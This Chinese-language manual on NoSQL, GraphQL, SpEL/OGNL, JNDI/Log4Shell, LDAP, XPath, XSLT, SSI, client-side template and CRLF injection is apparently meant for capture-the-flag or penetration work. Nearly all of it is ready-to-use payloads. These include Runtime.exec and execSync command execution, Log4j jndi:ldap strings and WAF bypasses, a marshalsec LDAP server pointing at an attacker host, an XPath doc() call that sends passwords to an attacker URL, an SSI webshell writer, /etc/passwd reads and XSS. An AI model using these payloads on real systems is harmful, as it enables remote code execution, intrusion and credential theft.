# NoSQL 与表达式类注入通用手册

适用题型（命中即召回本手册）：nosql mongodb 操作符注入 $where graphql introspection 内省 spel ognl mvel 表达式注入 jndi log4j log4shell rmi ldap 外带 xpath xslt ssi csti 客户端模板注入 模板注入 crlf 响应拆分

## 1. 识别与分类

| 命中信号 | 类型 | 判据 / 分支 |
|---|---|---|
| JSON 登录/搜索，报错含 operator/$/BSON | NoSQL | 操作符对象 `{"$ne":""}` 改变逻辑；`$where` 走服务端 JS |
| `/graphql` `__schema` `query{}` 结构 | GraphQL | 内省可用或字段建议报错；别名批量/深度嵌套/指令 |
| `${7*7}`=49 且 Java 栈 | EL 族 | `%{}`=OGNL(Struts2)、`T()`=SpEL；报错 OgnlException/SpelEvaluationException/ELException 定位引擎 |
| `${jndi:` 或 Log4j 日志栈、DNS 回调 | JNDI | 外带探针确认；JDK 8u121/8u191 阈值决定 RMI/LDAP/gadget |
| `(&(` 过滤器、LDAP/AD 认证 | LDAP | `*` 通配、空字节 `%00` 截断 DN |
| XML 查询、报错 XPathException | XPath | `' or '1'='1` 恒真、`|` 联合、`name()/substring()` 盲注 |
| 样式表/转换参数、XML→HTML | XSLT | `system-property('xsl:vendor')` 指纹 → 分引擎 RCE |
| `.shtml/.stm` 页面 | SSI | `<!--#echo` 变量回显 |
| `{{7*7}}` 在 DOM 回显 49 | CSTI | HTTP 响应原样、浏览器才计算（区别于 SSTI 的响应体 49） |
| 重定向/头参数回显 | CRLF | `%0D%0A` 注入后响应出现新头 |

## 2. 攻击方法论

1. **NoSQL 操作符注入**：JSON 登录把密码改成 `{"$ne":"x"}`/`{"$gt":""}` 恒真；URL 表单 `password[$ne]=` 或 `password[$regex]=^a.*`；盲注用 `$regex` 逐字符（登录成功=布尔 oracle），`$where` 时间盲注 `{"$where":"sleep(5000)"}`。
2. **GraphQL**：`POST /graphql` 内省 `{__schema{queryType{name} mutationType{name} types{name fields{name}}}}`；内省禁用靠字段建议报错 + 别名批量 `a1:user(id:1){email} a2:user(id:2){email}...` 绕过限速，深度嵌套 DoS，`@include(if:true)` 强制暴露字段。
3. **EL 判别与 RCE**：`${7*7}`→49 命中；SpEL 用 `${T(java.lang.Runtime).getRuntime().exec("id")}`，回显包 IOUtils/StreamUtils；OGNL 用 `%{(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec('id'))}`，绕过清 `_memberAccess`/`excludedClasses`；SimpleEvaluationContext 用反射 `''.class.forName`。Spring Cloud Gateway 走 actuator 加恶意路由 SpEL（CVE-2022-22947）；Struts2 在 Content-Type/文件名/namespace 注入 OGNL（S2-045/046/057）。
4. **JNDI/Log4j**：先 DNS 探针 `${jndi:dns://<token>}` 确认；起 LDAP 引用 `java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://<ATTACKER>/#Exploit" 1389`；JDK≥8u191 改走 LDAP 序列化 gadget 或 Tomcat BeanFactory+EL；Log4j（CVE-2021-44228）探测点含 UA/Referer/路径/表单，WAF 绕过 `${${lower:j}ndi:ldap://<ATTACKER>/x}`。
5. **LDAP 注入**：过滤器 `(&(uid=*)(password=*))` 绕过认证；盲注 `(&(uid=admin)(password=a*))` 逐字符、`|` 加 OR 条件；特殊字符 `*` `(` `)` `\` 需转义，空字节 `%00` 截断 DN 拼接。
6. **XPath 注入**：`' or '1'='1` 绕过认证；盲注函数 `name(/*[1])`/`substring()`/`string-length()`/`count()`/`starts-with()`；联合 `' | //user | '`；OOB `' or doc(concat('http://<ATTACKER>/?d=',//user[1]/password)) or '`。
7. **XSLT 注入**：先 `system-property('xsl:vendor')` 指纹引擎；读文件 `document('/etc/passwd')` 或 DTD 实体 `<!ENTITY x SYSTEM "file:///...">`；写文件 EXSLT `<exploit:document href="...">`；RCE 按引擎：PHP `php:function('readfile','index.php')` / Java `Runtime:exec` 扩展 / .NET `msxsl:script` C# Process.Start。
8. **SSI 注入**：`.shtml` 页面 `<!--#exec cmd="id" -->`、`<!--#include file="/etc/passwd" -->`、写 shell `<!--#exec cmd="echo '...' > /var/www/html/s.php" -->`；先 `<!--#echo var="DATE_LOCAL" -->` 验证启用。
9. **CSTI**：`{{7*7}}` 在 DOM 回显 49 判客户端；AngularJS 沙箱逃逸 `{{constructor.constructor('alert(1)')()}}`（1.6 用 `[].pop.constructor`）；Vue v-html/动态模板 `{{_c.constructor('alert(1)')()}}`；Vue SSR 升级 `{{this.constructor.constructor('return this')().process.mainModule.require('child_process').execSync('id').toString()}}`。
10. **CRLF**：重定向参数 `%0D%0ASet-Cookie:PHPSESSID=<固定值>` 会话固定；`%0D%0A%0D%0A<script>alert(1)</script>` 响应体注入 XSS；双 CRLF 缓存投毒；User-Agent/Referer 日志伪造。

## 3. 变体与绕过

- **WAF/过滤**：Log4j 大小写/嵌套 `${${lower:j}ndi:${lower:l}dap://...}`、`${${::-j}ndi:...}`；CRLF 双重编码 `%250D%250A`、Unicode `%E5%98%8A%E5%98%8D`、仅 LF `%0A`；SSI `<!-#exec cmd="id" ->` 变体；JSON 重复 key（WAF 校验首个、应用取末个）；类型混淆（Int 字段传 Object/Array）。
- **无回显/盲打**：NoSQL 用 `$regex` 布尔 + `$where sleep` 时间；LDAP/XPath 逐字符布尔；OOB 走 `doc()`/`document()`/DTD 实体/`${jndi:dns://}` 回调。
- **沙箱/黑名单**：SpEL `T()` 被禁走反射；OGNL 清 `_memberAccess` + `excludedClasses/excludedPackageNames`；AngularJS 1.0–1.6 各版本 payload（1.3 charAt 覆盖、1.5 Object.assign、1.6 pop.constructor）。
- **边界**：JDK 8u121 禁 RMI 远程类、8u191 禁 LDAP 远程类→序列化 gadget；XSLT 外部 DTD 被禁用改用 `document()`，extension 被禁退 SSRF/反序列化；GraphQL 控深度防 DoS 误伤自身。

## 战法要点

- 见 JSON 登录/搜索且报错含 operator/$/BSON → 直接 NoSQL 操作符注入，别套 SQLi 单引号。
- `${7*7}`=49 且 Java 栈 → 先判 `%{}`(OGNL)/`T()`(SpEL)/报错串再选 payload，别混用。
- JNDI/Log4j 一律先用 DNS 外带探针确认，再起 LDAP/RMI 服务器，避免空转。
- 无回显就切布尔/时间/OOB 三通道：`$regex`、`sleep`、`doc()/document()/DNS`。
- LDAP/XPath/NoSQL 认证绕过同属"恒真条件"族，先打最小恒真 payload 确认注入点再深挖。
- GraphQL 先内省，禁用则靠字段建议报错 + 别名批量枚举。
- CSTI/SSTI 靠"回显在 HTTP 响应还是浏览器 DOM"区分：响应体 49=SSTI 打 RCE，DOM 49=CSTI 打 XSS。
- 表达式类 RCE 一律先捕获输出（IOUtils/StreamUtils/回显头）再打，exec 不回显等于白打。

## 速查清单
```text
# NoSQL
{"username":"admin","password":{"$ne":"x"}}      password[$regex]=^a.*      {"$where":"sleep(5000)"}
# GraphQL
{__schema{types{name fields{name}}}}              a1:user(id:1){email} a2:user(id:2){email}
# EL / SpEL / OGNL / JavaEL
${T(java.lang.Runtime).getRuntime().exec("id")}   %{(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec('id'))}
${''.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}
# JNDI / Log4j
${jndi:dns://<token>}   ${jndi:ldap://<ATTACKER>:1389/Exploit}   ${${lower:j}ndi:ldap://<ATTACKER>/x}
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://<ATTACKER>/#Exploit" 1389
# LDAP / XPath
(&(uid=*)(password=*))      ' or '1'='1      ' or name(/*[1])='x' or '      ' | //user | '
# XSLT
system-property('xsl:vendor')   document('/etc/passwd')   php:function('readfile','index.php')
# SSI
<!--#exec cmd="id" -->        <!--#include file="/etc/passwd" -->
# CSTI
{{7*7}}   {{constructor.constructor('alert(1)')()}}   {{this.constructor.constructor('return this')().process.mainModule.require('child_process').execSync('id').toString()}}
# CRLF
%0D%0A   %0D%0A%0D%0A   %250D%250A
```
